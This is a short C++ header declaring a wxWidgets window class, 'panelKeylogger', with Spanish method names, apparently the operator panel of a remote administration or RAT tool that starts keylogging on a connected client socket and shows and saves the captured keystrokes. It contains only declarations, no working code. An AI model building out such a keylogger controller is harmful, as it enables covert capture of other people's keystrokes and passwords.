#ifndef __KEYLOG_
#define __KEYLOG_

#include "headers.hpp"

class panelKeylogger : public wxFrame {
	public:
		panelKeylogger(wxWindow* pParent, SOCKET sck, std::string _strID);
		
		void AgregarData(const char*& pBuffer);

	private:
		wxToggleButton* btn_Iniciar = nullptr;
		wxTextCtrl* txt_Data = nullptr;
		SOCKET sckCliente = INVALID_SOCKET;

		void OnToggle(wxCommandEvent& event); 
		void OnLimpiar(wxCommandEvent& event);
		void OnGuardarLog(wxCommandEvent& event);

		wxDECLARE_EVENT_TABLE();
};

#endif